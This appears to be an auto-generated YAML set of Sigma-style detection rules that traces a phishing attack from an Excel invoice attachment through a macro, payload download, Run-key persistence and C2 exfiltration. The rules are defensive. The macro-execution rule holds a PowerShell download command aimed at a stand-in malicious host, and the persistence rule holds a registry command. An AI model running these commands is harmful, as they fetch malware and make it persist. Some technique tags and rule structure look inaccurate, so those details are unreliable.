```yaml
- title: Identify Initial Access via Email
  id: 123e4567-e89b-12d3-a456-426614174000
  description: Monitor for the creation of processes related to Microsoft Outlook when an email with the subject line "Important Update" and an attachment named "Invoice_2023.xlsx" is received.
  status: production
  author: auto-generated
  date: 2023-10-01
  logsource:
    category: custom
    product: windows
  detection:
    selection:
      srcNode.Type: "Process"
      srcNode.Image: "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE"
      dstNode.Type: "File"
      dstNode.Name: "Invoice_2023.xlsx"
      relation: "Process Create"
  condition: selection
  tags:
    - ATT&CK ID: T1203
    - tactic: Initial Access
  level: high
---
- title: Identify Opening the Malicious Attachment
  id: 123e4567-e89b-12d3-a456-426614174001
  description: Monitor for the execution of Microsoft Excel when the user opens the attachment "Invoice_2023.xlsx".
  status: production
  author: auto-generated
  date: 2023-10-01
  logsource:
    category: custom
    product: windows
  detection:
    selection:
      srcNode.Type: "Process"
      srcNode.Image: "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE"
      dstNode.Type: "File"
      dstNode.Name: "Invoice_2023.xlsx"
      relation: "Process Create"
  condition: selection
  tags:
    - ATT&CK ID: T1203
    - tactic: Initial Access
  level: high
---
- title: Identify Macro Execution
  id: 123e4567-e89b-12d3-a456-426614174002
  description: Monitor for the execution of PowerShell commands triggered by macros within the Excel file, specifically looking for the command that downloads a payload from a remote server.
  status: production
  author: auto-generated
  date: 2023-10-01
  logsource:
    category: custom
    product: windows
  detection:
    selection:
      srcNode.Type: "Process"
      srcNode.Image: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
      srcNode.Cmdline: '-ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri \'http://malicious-server.com/payload.exe\' -OutFile \'C:\\Users\\%USERNAME%\\AppData\\Local\\Temp\\payload.exe\'"'
      dstNode.Type: "File"
      dstNode.Name: "payload.exe"
      relation: "Process Create"
  condition: selection
  tags:
    - ATT&CK ID: T1203
    - tactic: Execution
  level: high
---
- title: Identify Payload Execution
  id: 123e4567-e89b-12d3-a456-426614174003
  description: Monitor for the execution of the downloaded payload located in the Temp directory.
  status: production
  author: auto-generated
  date: 2023-10-01
  logsource:
    category: custom
    product: windows
  detection:
    selection:
      srcNode.Type: "Process"
      srcNode.Image: "C:\\Users\\%USERNAME%\\AppData\\Local\\Temp\\payload.exe"
      relation: "Process Create"
  condition: selection
  tags:
    - ATT&CK ID: T1203
    - tactic: Execution
  level: high
---
- title: Identify Establishing Persistence
  id: 123e4567-e89b-12d3-a456-426614174004
  description: Monitor for registry modifications that create persistence for the payload, specifically looking for the creation of a registry entry under "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run".
  status: production
  author: auto-generated
  date: 2023-10-01
  logsource:
    category: custom
    product: windows
  detection:
    selection:
      srcNode.Type: "Process"
      srcNode.Image: "C:\\Windows\\System32\\reg.exe"
      srcNode.Cmdline: 'add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "MaliciousPayload" /t REG_SZ /d "C:\\Users\\%USERNAME%\\AppData\\Local\\Temp\\payload.exe" /f'
      dstNode.Type: "Registry"
      dstNode.Key: "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
      relation: "RegSetValue"
  condition: selection
  tags:
    - ATT&CK ID: T1547
    - tactic: Persistence
  level: high
---
- title: Identify Data Exfiltration
  id: 123e4567-e89b-12d3-a456-426614174005
  description: Monitor for network connections initiated by the payload to a command and control (C2) server for data exfiltration.
  status: production
  author: auto-generated
  date: 2023-10-01
  logsource:
    category: custom
    product: windows
  detection:
    selection:
      srcNode.Type: "Process"
      srcNode.Image: "C:\\Users\\%USERNAME%\\AppData\\Local\\Temp\\payload.exe"
      dstNode.Type: "Network"
      dstNode.Dstaddress: "malicious-server.com"
      relation: "TCP Connect"
  condition: selection
  tags:
    - ATT&CK ID: T1041
    - tactic: Exfiltration
  level: high
---
- title: Identify Cleanup Actions
  id: 123e4567-e89b-12d3-a456-426614174006
  description: Monitor for the deletion of the original email or attachment by the user, which may indicate an attempt to cover tracks.
  status: production
  author: auto-generated
  date: 2023-10-01
  logsource:
    category: custom
    product: windows
  detection:
    selection:
      srcNode.Type: "Process"
      srcNode.Image: "C:\\Windows\\explorer.exe"
      dstNode.Type: "File"
      dstNode.Name: "Invoice_2023.xlsx"
      relation: "DeleteFile"
  condition: selection
  tags:
    - ATT&CK ID: T1070
    - tactic: Defense Evasion
  level: medium
```